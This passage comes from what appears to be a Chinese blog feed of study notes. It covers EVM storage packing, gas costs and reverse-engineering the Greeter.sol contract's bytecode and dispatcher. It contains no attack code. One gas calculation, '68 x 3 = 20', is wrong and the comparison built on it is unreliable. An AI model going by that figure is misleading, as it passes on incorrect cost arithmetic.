<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint128 a;</span><br><span class="line">    uint128 b;</span><br><span class="line">    function C() &#123;</span><br><span class="line">      a = 1;</span><br><span class="line">      b = 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，将其余部分省略，运行构造函数的部分如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**********************     a = 1    ********************************/</span><br><span class="line">60 01                                 PUSH1 0x1           stack: [0x1]</span><br><span class="line">60 00                                 PUSH1 0x0           stack: [0x0 0x1]</span><br><span class="line">80                                    DUP1                stack: [0x0 0x0 0x1]</span><br><span class="line">61 0100                               PUSH2 0x100         stack: [0x100 0x0 0x0 0x1]</span><br><span class="line">0a                                    EXP(base, exponent) stack: [0x01 0x0 0x1]</span><br><span class="line">81                                    DUP2                stack: [0x0 0x1 0x0 0x1]</span><br><span class="line">54                                    SLOAD(location)     stack: [0x0 0x1 0x0 0x1]</span><br><span class="line">81                                    DUP2                stack: [0x1 0x0 0x1 0x0 0x1]</span><br><span class="line">6f ffffffffffffffffffffffffffffffff   PUSH16              stack: [0xffffffffffffffffffffffffffffffff 0x1 0x0 0x1 0x0 0x1]</span><br><span class="line">02                                    MUL(x, y)           stack: [0xffffffffffffffffffffffffffffffff 0x0 0x1 0x0 0x1]</span><br><span class="line">19                                    NOT                 stack: [0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 0x0 0x1 0x0 0x1]</span><br><span class="line">16                                    AND(x, y)           stack: [0x0 0x1 0x0 0x1]</span><br><span class="line">90                                    SWAP1               stack: [0x1 0x0 0x0 0x1]</span><br><span class="line">83                                    DUP4                stack: [0x1 0x1 0x0 0x0 0x1]</span><br><span class="line">6f ffffffffffffffffffffffffffffffff   PUSH16              stack: [0xffffffffffffffffffffffffffffffff 0x1 0x1 0x0 0x0 0x1]</span><br><span class="line">16                                    AND                 stack: [0x1 0x1 0x0 0x0 0x1]</span><br><span class="line">02                                    MUL                 stack: [0x1 0x0 0x0 0x1]</span><br><span class="line">17                                    OR                  stack: [0x1 0x0 0x1]</span><br><span class="line">90                                    SWAP1               stack: [0x0 0x1 0x1]</span><br><span class="line">55                                    SSTORE(pos, val)    stack: [0x1]</span><br><span class="line">                                                          heap:  &#123;0x0 =&gt; 0x1&#125;</span><br><span class="line">50                                    POP                 stack: []</span><br><span class="line"></span><br><span class="line">/**********************     b = 2    ********************************/</span><br><span class="line">60 02                                 PUSH1 0x2           stack: [0x2]</span><br><span class="line">60 00                                 PUSH1 0x0           stack: [0x0 0x2]</span><br><span class="line">60 10                                 PUSH1 0x10          stack: [0x10 0x0 0x2]</span><br><span class="line">61 0100                               PUSH2 0x100         stack: [0x100 0x10 0x0 0x2]</span><br><span class="line">0a                                    EXP                 stack: [0x100000000000000000000000000000000 0x0 0x2]</span><br><span class="line">81                                    DUP2                stack: [0x0 0x100000000000000000000000000000000 0x0 0x2]</span><br><span class="line">54                                    SLOAD(location)     stack: [0x1 0x100000000000000000000000000000000 0x0 0x2]</span><br><span class="line">81                                    DUP2                stack: [0x100000000000000000000000000000000 0x1 0x100000000000000000000000000000000 0x0 0x2]</span><br><span class="line">6f ffffffffffffffffffffffffffffffff   PUSH16              stack: [0xffffffffffffffffffffffffffffffff 0x100000000000000000000000000000000 0x1 0x100000000000000000000000000000000 0x0 0x2]</span><br><span class="line">02                                    MUL                 stack: [0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 0x1 0x100000000000000000000000000000000 0x0 0x2]</span><br><span class="line">19                                    NOT                 stack: [0x00000000000000000000000000000000ffffffffffffffffffffffffffffffff 0x1 0x100000000000000000000000000000000 0x0 0x2]</span><br><span class="line">16                                    AND                 stack: [0x1 0x100000000000000000000000000000000 0x0 0x2]</span><br><span class="line">90                                    SWAP1               stack: [0x100000000000000000000000000000000 0x1 0x0 0x2]</span><br><span class="line">83                                    DUP4                stack: [0x2 0x100000000000000000000000000000000 0x1 0x0 0x2]</span><br><span class="line">6f ffffffffffffffffffffffffffffffff   PUSH16              stack: [0xffffffffffffffffffffffffffffffff 0x2 0x100000000000000000000000000000000 0x1 0x0 0x2]</span><br><span class="line">16                                    AND                 stack: [0x2 0x100000000000000000000000000000000 0x1 0x0 0x2]</span><br><span class="line">02                                    MUL                 stack: [0x200000000000000000000000000000000 0x1 0x0 0x2]</span><br><span class="line">17                                    OR                  stack: [0x200000000000000000000000000000001 0x0 0x2]</span><br><span class="line">90                                    SWAP1               stack: [0x0 0x200000000000000000000000000000001 0x2]</span><br><span class="line">55                                    SSTORE              stack: [0x2]</span><br><span class="line">                                                          heap:  &#123;0x0 =&gt; 0x200000000000000000000000000000001&#125;</span><br><span class="line">50                                    POP                 stack: []</span><br></pre></td></tr></table></figure>
<p>总得来讲上面的代码分为两个部分第一部分对应<code>a = 1</code>，这部分代码在地址<code>0x0</code>的低 16 字节里存入0x1；第二部分对应<code>b = 2</code>，它表示在 <code>0x0</code> 的高 16 字节里面存入 0x2.</p>
<p>所以在运行完上面的代码之后，我们只使用了 World State 里面的一个 key，即<code>0x0</code>，完成了对两个变量的保存。 用更形象的方式可以表示成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[         b         ][         a         ]</span><br><span class="line">[16 bytes / 128 bits][16 bytes / 128 bits]</span><br></pre></td></tr></table></figure>
<h1>打包存储:</h1>
<p>那么问题来了，为什么虚拟机要做这个变动？这两个例子的 Solidity 代码几乎一样，我们只是改变了变量的类型而已，然而虚拟机为第二个例子编译出的字节码比之前例子的字节码长了不止一倍。要知道，这些增加的字节码可是会直接影响 <code>Transaction</code> 的大小的。所以虚拟机到底是出于何种目的来产生了如此多的字节码的呢？</p>
<p>其实对于上面的问题有一个简单的答案，那就是 <code>gas。</code><br />
我们知道执行、部署合约是需要消耗 <code>gas</code> 的，而具体到 EVM 的层面，那就是每个操作码都有其对应的需要消耗的 <code>gas</code>。</p>
<p>下面是对一些操作码消耗 gas 的说明：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>sstore</code>当使用这个操作码往一个新的地址中存入数据时消耗 20000 gas</p>
</li>
<li class="lvl-2">
<p><code>sstore</code>当使用这个操作码往一个已有的地址中存入数据时消耗 5000 gas</p>
</li>
<li class="lvl-2">
<p><code>sload</code>当使用这个操作码从 World State 中读取数据，消耗 500 gas</p>
</li>
</ul>
<p>其余的操作码消耗 3 到 10 gas</p>
<p>所以在两个例子中我们消耗的 gas 分别为：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>20000 + 20000 = 40000</p>
</li>
<li class="lvl-2">
<p>500 + 20000 + 5000 + 500 = 26000</p>
</li>
</ul>
<p>在打包存储的情况下，因为我们第二次使用<code>sstore</code>时，只是往已有的地址中再次写入数据，所以我们省掉了 15000 的 gas。正是由于这个原因，虚拟机才宁愿编译出如此复杂的字节码，也不愿意直接使用来个存储地址。</p>
<h1>编译优化:</h1>
<p>其实上述字节码还是略显冗长，因为很容易想到，我们其实可以在内存里面先准备好<code>a</code>和<code>b</code>对应的数据，然后在一次性的存到<code> World State</code> 里面，这样一来我们还可以再节省掉第二个<code>sstore</code>所消耗的 5000gas。我们可以通过指示编译器优化字节码的方式来达到这个目的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">solc --bin --asm --optimize file_name.sol</span><br></pre></td></tr></table></figure>
<p>我们现在再进行一次编译，看看结果会如何</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60 00                                 PUSH 0x0</span><br><span class="line">80                                    DUP1</span><br><span class="line">54                                    SLOAD</span><br><span class="line">70 0200000000000000000000000000000000 PUSH17</span><br><span class="line"></span><br><span class="line">/* not(sub(exp(0x2, 0x80), 0x1)) 高16字节bitmask */</span><br><span class="line">60 01                                 PUSH 0x1</span><br><span class="line">60 80                                 PUSH 0x80</span><br><span class="line">60 02                                 PUSH 0x2</span><br><span class="line">0a                                    EXP</span><br><span class="line">03                                    SUB</span><br><span class="line">19                                    NOT</span><br><span class="line"></span><br><span class="line">90                                    SWAP1</span><br><span class="line">91                                    SWAP2</span><br><span class="line">16                                    AND</span><br><span class="line">60 01                                 PUSH 0x1</span><br><span class="line">17                                    OR</span><br><span class="line"></span><br><span class="line">/* sub(exp(0x2, 0x80), 0x1) 低16字节bitmask */</span><br><span class="line">60 01                                 PUSH 0x1</span><br><span class="line">60 80                                 PUSH 0x80</span><br><span class="line">60 02                                 PUSH 0x02</span><br><span class="line">0a                                    EXP</span><br><span class="line">03                                    SUB</span><br><span class="line"></span><br><span class="line">16                                    AND</span><br><span class="line">17                                    OR</span><br><span class="line">90                                    SWAP1</span><br><span class="line">55                                    SSTORE</span><br></pre></td></tr></table></figure>
<p>从上面我们可以看出，虚拟机通过使用 <code>bitmask</code> 分别将高 16 字节和低 16 字节赋值，而且只使用了一个<code>sstore</code>指令就像数据存入了 <code>World State</code> 里面。优化目的达成！</p>
<p>但是，等等，为什么要在字节码中直接嵌入<code>0200000000000000000000000000000000</code>这 17 个字节？</p>
<p>要知道我们只需要做一个简单运算便能获得这个值：<code>exp(0x2, 0x81)</code>。 换句话说，我们其实只需要用 3 个字节就能代表这 17 个字节，但是虚拟机为什么没有这么做呢？答案很简单，仍然是 <code>gas</code>。让我们来看看每个字节消耗 <code>gas</code> 的规则：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>每一个 0 字节消耗 4 个 gas</p>
</li>
<li class="lvl-2">
<p>每一个非 0 字节消耗 68gas</p>
</li>
</ul>
<p>根据这个规则，我们很容易计算出两种情况下消耗的 gas 的值：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>68 + 16 x 4 = 132</p>
</li>
<li class="lvl-2">
<p>68 x 3 = 20</p>
</li>
</ul>
<p>所以直接嵌入<code>0200000000000000000000000000000000</code>虽然显得笨拙，但是贵在便宜。虚拟机宁愿增加字节码的大小也想为用户节约每一个 gas。</p>
<h1>总结:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>智能合约的生命周期被严格的划分为两个阶段：部署时和运行时。</p>
</li>
<li class="lvl-2">
<p>智能合约的构造函数在且仅在部署时运行，一旦被部署就不可能再次运行构造函数了。</p>
</li>
<li class="lvl-2">
<p><code>World State</code> 是一个键值对，每一个键对应一个 32 字节长的数据块。</p>
</li>
<li class="lvl-2">
<p>因为上面一点，以太坊虚拟机是一个 256 位机，其天生就是用来对 32 字节长的数据做运算的。</p>
</li>
<li class="lvl-2">
<p>往 <code>World State</code> 里面存数据是非常昂贵的。</p>
</li>
<li class="lvl-2">
<p>以太坊虚拟机一切向钱看，所有的优化都是围绕减少所需 <code>gas</code> 而进行的。</p>
</li>
</ul>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md">https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md</a>    (有介绍到pyethereum客户端的列表，maybe有空可以看看)</p>
</li>
<li class="lvl-2">
<p><a href="https://www.ethervm.io/#MSTORE">https://www.ethervm.io/#MSTORE</a> (这里可以看每个opcode对stack的操作)</p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.github.io/yellowpaper/paper.pdf">https://ethereum.github.io/yellowpaper/paper.pdf</a>   黄皮书里的附录</p>
</li>
<li class="lvl-2">
<p><a href="https://www.arcblock.io/blog/zh/post/2018/12/08/evm-part-1/">深入探索EVM : 编译和部署智能合约</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-逆向分析以太坊智能合约Part1</title>
    <url>/2022/16132.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://www.anquanke.com/post/id/101979">逆向分析以太坊智能合约（part1）</a> 学习记录+Demo测试原文地址：<a href="https://arvanaghi.com/blog/reversing-ethereum-smart-contracts/">https://arvanaghi.com/blog/reversing-ethereum-smart-contracts/</a></p>
<p>介绍以太坊虚拟机（Ethereum Virtual Machine，EVM）的工作原理，以及如何对智能合约（smart contract）进行逆向分析。</p>
<h1>以太坊虚拟机:</h1>
<p>以太坊虚拟机（EVM）是一种<strong>基于栈</strong>的、<strong>准图灵完备</strong>(quasi-Turing complete)的虚拟机。</p>
<h2 id="基于栈：">基于栈：</h2>
<p>EVM并不依赖寄存器，任何操作都会在栈中完成。操作数、运算符以及函数调用都置于栈中，并且EVM知道如何处理数据、执行智能合约。</p>
<p>以太坊使用<code>Postfix Notation（后缀表示法）</code>来实现基于栈的运行机制。简而言之，操作符最后压入栈，可以作用于先前压入栈的数据。</p>
<p>举个例子：来看一下<code>2 + 2</code>操作，在脑海中，我们知道中间的运算符（<code>+</code>）表示我们想执行2加2这个操作。将<code>+</code>放在两个操作数之间是一种办法，我们也可以将它放在两个操作数后面，即<code>2 2 +</code>，这就是后缀表示法。</p>
<h2 id="准图灵完备：">准图灵完备：</h2>
<p>如果一切可计算的问题都能计算，那么这样的编程语言或者代码执行引擎就可以称为“图灵完备（Turing complete）”。这个概念并不在意解决问题的时间长短，只要理论上该问题能被解决即可。比特币脚本语言不能称为图灵完备语言，因为该语言的应用场景非常有限。</p>
<p>在EVM中，我们可以解决所有问题。但我们还是将其成为“准图灵完备”，这主要是因为成本限制问题。</p>
<p><code>gas</code>是EVM中的一个可计算单位，可以用来衡量操作所需的成本。当某人在区块链上发起交易时，交易代码以及待执行的任何后续代码都需要在矿工的主机上执行。由于代码需要在矿工的内存中执行，这个过程会消耗矿工主机的成本，如电力成本、内存以及CPU计算成本等。</p>
<p>为了激励矿工来保证交易顺利进行，发起交易的那个人需要声明<code>gas price</code>，或者他们愿意为每个计算单元支付的价格。将这个因素考虑在内后，对于非常复杂的问题，所需的<code>gas</code>量将变得非常庞大，此时由于我们需要为<code>gas</code>定价，因此在以太坊中，从经济角度来考虑的话复杂的交易并不划算。</p>
<h1>Bytecode的组成:</h1>
<p>在编译合约时，我们可以得到完整的<code>Bytecode</code>字节码，可划分为3个部分：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Deployment Bytecode(部署字节码)</p>
<ul class="lvl-2">
<li class="lvl-4">执行初始化新合约账户的所有操作,包含:</li>
<li class="lvl-4">包含用户实际交易调用这个新合约时需要执行的字节码(即运行时字节码)</li>
<li class="lvl-4">合约的构造函数中进行初始化处理的代码</li>
</ul>
</li>
<li class="lvl-2">
<p>Runtime bytecode(运行时字节码)</p>
<ul class="lvl-2">
<li class="lvl-4">当新合约被调用时所执行的所有字节码，不包含需要在部署中用来初始化合约的字节码。</li>
</ul>
</li>
<li class="lvl-2">
<p>Auxdata</p>
<ul class="lvl-2">
<li class="lvl-4">Auxdata 是源代码的密码指纹，用于验证。这只是数据，从未由 EVM 执行。</li>
</ul>
</li>
</ul>
<p><code>Greeter.sol</code>  <a href="https://github.com/ethereum/ethereum-org/blob/master/views/content/greeter.md">link</a>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.22</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Mortal</span> &#123;</span><br><span class="line">    <span class="comment">/* Define variable owner of the type address */</span></span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This constructor is executed at initialization and sets the owner of the contract */</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) public &#123; owner = msg.<span class="property">sender</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function to recover the funds on the contract */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">kill</span>(<span class="params"></span>) public &#123; <span class="keyword">if</span> (msg.<span class="property">sender</span> == owner) <span class="title function_">selfdestruct</span>(msg.<span class="property">sender</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Greeter</span> is <span class="title class_">Mortal</span> &#123;</span><br><span class="line">    <span class="comment">/* Define variable greeting of the type string */</span></span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This runs when the contract is executed */</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _greeting</span>) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main function */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params"></span>) public view returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>solc编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ solc --bin Greeter.sol</span><br><span class="line"></span><br><span class="line">======= Greeter.sol:Greeter =======</span><br><span class="line">Binary:</span><br><span class="line">608060405234801561001057600080fd5b5060405161040e38038061040e8339818101604052602081101561003357600080fd5b810190808051604051939291908464010000000082111561005357600080fd5b8382019150602082018581111561006957600080fd5b825186600182028301116401000000008211171561008657600080fd5b8083526020830192505050908051906020019080838360005b838110156100ba57808201518184015260208101905061009f565b50505050905090810190601f1680156100e75780820380516001836020036101000a031916815260200191505b50604052505050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806001908051906020019061014492919061014b565b50506101f0565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061018c57805160ff19168380011785556101ba565b828001600101855582156101ba579182015b828111156101b957825182559160200191906001019061019e565b5b5090506101c791906101cb565b5090565b6101ed91905b808211156101e95760008160009055506001016101d1565b5090565b90565b61020f806101ff6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806341c0e1b51461003b578063cfae321714610045575b600080fd5b6100436100c8565b005b61004d610138565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561008d578082015181840152602081019050610072565b50505050905090810190601f1680156100ba5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415610136573373ffffffffffffffffffffffffffffffffffffffff16ff5b565b606060018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101d05780601f106101a5576101008083540402835291602001916101d0565b820191906000526020600020905b8154815290600101906020018083116101b357829003601f168201915b505050505090509056fea265627a7a723158206f24f4307507b779edd30cf59bfb6e8ace69f2973e780c4ec5701dbf9a62257f64736f6c63430005110032</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ solc --bin-runtime Greeter.sol</span><br><span class="line"></span><br><span class="line">======= Greeter.sol:Greeter =======</span><br><span class="line">Binary of the runtime part:</span><br><span class="line">608060405234801561001057600080fd5b50600436106100365760003560e01c806341c0e1b51461003b578063cfae321714610045575b600080fd5b6100436100c8565b005b61004d610138565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561008d578082015181840152602081019050610072565b50505050905090810190601f1680156100ba5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415610136573373ffffffffffffffffffffffffffffffffffffffff16ff5b565b606060018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101d05780601f106101a5576101008083540402835291602001916101d0565b820191906000526020600020905b8154815290600101906020018083116101b357829003601f168201915b505050505090509056fea265627a7a723158206f24f4307507b779edd30cf59bfb6e8ace69f2973e780c4ec5701dbf9a62257f64736f6c63430005110032</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717140120.png" alt="20220717140120" /></p>
<p>如上所示，我们可知<code>runtime bytecode</code>是<code>contract bytecode</code>的一个子集。</p>
<h1>逆向分析:</h1>
<p>我们只逆向runtime bytecode，因为这个过程足以告诉我们合约具体做了哪些工作。</p>
<blockquote>
<p>不知道原文代码块的编译器版本，所以没法获得一样的字节码，主要看看分析思路</p>
</blockquote>
<p>ethersplay的导入过程：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>复制 ascii 十六进制字符串，然后在 <code>Binary Ninja</code> 中创建一个新文件。</p>
</li>
<li class="lvl-2">
<p>右键单击并选择<code>Paste From -&gt; Raw Hex</code>。</p>
</li>
<li class="lvl-2">
<p>将此文件另存为<code>test.evm</code>并关闭它。在用</p>
</li>
<li class="lvl-2">
<p>不能直接将solc命令行输出的bytecode直接保存在<code>.evm</code>文件里，会读取不到</p>
</li>
</ul>
<h2 id="QuickView">QuickView:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717141936.png" alt="20220717141936" /></p>
<blockquote>
<p>与原文的图不一样，问题不大，参考思路，自己推导</p>
</blockquote>
<p>Ethersplay插件可以识别runtime bytecode中的所有函数，从逻辑上进行划分。对于这个合约，<code>Ethersplay</code>发现了函数：<code>kill()</code> 、<code>greet()</code>。后面我们会介绍如何提取这些函数。</p>
<h2 id="第一条指令">第一条指令:</h2>
<p>当我们向智能合约发起交易时，首先碰到的是合约的<code>dispatcher(调度器)</code>。<code>Dispatcher</code>会处理交易数据，确定我们需要交互的具体函数。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717161417.png" alt="20220717161417" /></p>
<p>模拟opcode在栈里的操作：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717165456.png" alt="20220717165456" /></p>
<h2 id="函数调度的前置判断：">函数调度的前置判断：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717165643.png" alt="20220717165643" /></p>
<p>模拟opcode在栈里的操作：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717171226.png" alt="20220717171226" /></p>
<p>为什么EVM需要检查我们提供的calldata大小是否至少为4字节？这里涉及到函数的识别过程。</p>
<p>EVM会通过函数keccak256哈希的前4个字节来识别函数。也就是说，<code>函数原型（函数名以及所需参数）</code>需要交给keccak256哈希函数处理。在这个合约中，我们可以得到如下结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keccak256(&quot;greet()&quot;) = cfae3217...</span><br><span class="line">keccak256(&quot;kill()&quot;) = 41c0e1b5...</span><br></pre></td></tr></table></figure>
<p>因此，<code>greet()</code>的函数标识符为<code>cfae3217</code>，<code>kill()</code>的函数标识符为<code>41c0e1b5</code>。Dispatcher会检查我们发往合约的<code>calldata</code>（或者消息数据）大小至少为4字节，以确保我们的确想跟某个函数交互。</p>
<p>函数标识符大小始终为4字节，因此如果我们发往智能合约的数据小于4字节，除非定义了回退函数，否则必定无法匹配到可交互的函数，就无法与任何函数交互。</p>
<h2 id="函数调度">函数调度:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717175933.png" alt="20220717175933" /></p>
<p>模拟opcode在栈里的操作：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717175844.png" alt="20220717175844" /></p>
<p>其中重要的操作是：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>通过逻辑移位的方式，取出4字节的函数标识符。</p>
</li>
<li class="lvl-2">
<p><code>kill()</code>的函数标识符与 tx的函数标识符比对，相等则跳到 kill函数去</p>
</li>
</ul>
<p>这个过程正是dispatcher的“调度”过程：将<code>calldata</code>函数标识符与智能合约中所有的函数标识符进行对比。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kill()的函数标识符与 tx的函数标识符比对</span></span><br><span class="line">PUSH4   <span class="comment">#41c0e1b5  // kill()函数</span></span><br><span class="line">EQ</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># greet()的函数标识符与 tx的函数标识符比对</span></span><br><span class="line">PUSH4   <span class="comment">#cfae3217  // greet()函数</span></span><br><span class="line">EQ</span><br></pre></td></tr></table></figure>
<p>如果我们没有跳转到kill()函数，那么<code>dispatcher</code>依然会采用相同逻辑，将calldata函数标识符与greet()函数标识符进行对比。</p>
<p><code>Dispatcher</code>会检查智能合约中的每个函数，如果不能找到匹配的函数，则会将我们引导至程序退出代码。</p>
<h1>Summary:</h1>
<p>以上是对以太坊虚拟机工作原理的简单介绍，画个图总结一下</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717182929.png" alt="20220717182929" /></p>
<p>(6) kill()的函数标识符与 tx的函数标识符比对，跳转到kill函数</p>
<h1>Online Solidity Decompiler:</h1>
<p><a href="https://ethervm.io/decompile">online decompile</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717183206.png" alt="20220717183206" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717183235.png" alt="20220717183235" /></p>
<p>有一些提示信息不错，伪代码，反编译块的输入和输出，前期不熟悉的时候可以自己手动模拟stack的操作了，后期可以直接看input/output。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://cypherpunks-core.github.io/ethereumbook/13evm.html">https://cypherpunks-core.github.io/ethereumbook/13evm.html</a></p>
</li>
<li class="lvl-2">
<p><a href="https://medium.com/epik-systems/understanding-solidity-assembly-using-shr-and-shl-for-byte-manipulation-a9f3503cc8d9">Understanding Solidity Assembly: Using <code>shr</code> and <code>shl</code> for Byte Manipulation</a></p>
</li>
<li class="lvl-2">
<p><a href="https://eips.ethereum.org/EIPS/eip-145">EIP-145：EVM 中的按位移位指令 </a></p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.stackexchange.com/questions/42584/what-is-auxdata-in-the-asm-output-from-solc">solc 的 asm 输出中的 auxdata 是什么？</a></p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.stackexchange.com/questions/113204/solidity-shr-opcode">Solidity shr 操作码</a></p>
</li>
<li class="lvl-2">
<p><a href="https://ethervm.io/decompile">online decompile</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md">https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md</a> (每个opcode的出入参个数)</p>
</li>
<li class="lvl-2">
<p><a href="https://www.ethervm.io/#MSTORE">https://www.ethervm.io/#MSTORE</a> (这里可以看每个opcode对stack的操作)</p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.github.io/yellowpaper/paper.pdf">https://ethereum.github.io/yellowpaper/paper.pdf</a> 黄皮书里的附录</p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-逆向分析以太坊智能合约Part2</title>
    <url>/2022/15939.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://www.anquanke.com/post/id/106984">逆向分析以太坊智能合约（part2）</a> 学习记录+Demo测试原文地址：<a href="https://arvanaghi.com/blog/reversing-ethereum-smart-contracts-pt2/">https://arvanaghi.com/blog/reversing-ethereum-smart-contracts-pt2/</a></p>
<p>在part1中，我们初步逆向分析了<code>Greeter.sol</code>合约。我们仔细研究了<code>Greeter.sol</code>的<code>dispatcher</code>。作为合约的一部分，dispatch可以接收交易数据，决定应该发送哪个函数。</p>
<p><code>Greeter.sol</code>:</p>
<blockquote>
<p>part1原文里的<code>Greeter.sol</code>是稍微简单一些的，但我是直接去github找的代码，是跟part2里的一样的</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.22</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Mortal</span> &#123;</span><br><span class="line">    <span class="comment">/* Define variable owner of the type address */</span></span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This constructor is executed at initialization and sets the owner of the contract */</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) public &#123; owner = msg.<span class="property">sender</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function to recover the funds on the contract */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">kill</span>(<span class="params"></span>) public &#123; <span class="keyword">if</span> (msg.<span class="property">sender</span> == owner) <span class="title function_">selfdestruct</span>(msg.<span class="property">sender</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Greeter</span> is <span class="title class_">Mortal</span> &#123;</span><br><span class="line">    <span class="comment">/* Define variable greeting of the type string */</span></span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This runs when the contract is executed */</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _greeting</span>) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main function */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params"></span>) public view returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
